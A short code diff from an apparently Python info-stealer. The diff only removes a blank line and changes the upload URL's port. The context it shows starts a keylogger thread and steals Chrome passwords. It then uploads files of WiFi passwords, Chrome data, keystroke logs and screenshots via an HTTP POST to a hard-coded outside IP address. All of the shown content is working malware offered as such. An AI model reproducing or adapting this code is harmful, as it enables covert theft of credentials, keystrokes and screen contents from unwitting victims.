@@ -14,7 +14,6 @@ def exit_():
     exit(0)
 
 
-
 print('Keylogger started..')
 X = Thread(target=Keylogger.keylogger, daemon=True).start()
 ChromeStealer.StealPasswords()
@@ -32,4 +31,4 @@ with open("wifiPasswords.txt", "rb") as wifi, \
         open('screenshot1.png', 'rb') as ss1, \
         open('screenshot2.png', 'rb') as ss2:
     file_dict = {"wifi": wifi, 'crm': crm, 'c1': c1, 'c2': c2, 'log': log, 'screenshot1': ss1, 'screenshot2': ss2}
-    response = rq.post("http://40.115.36.79:8080/upload", files=file_dict)
+    response = rq.post("http://40.115.36.79/upload", files=file_dict)
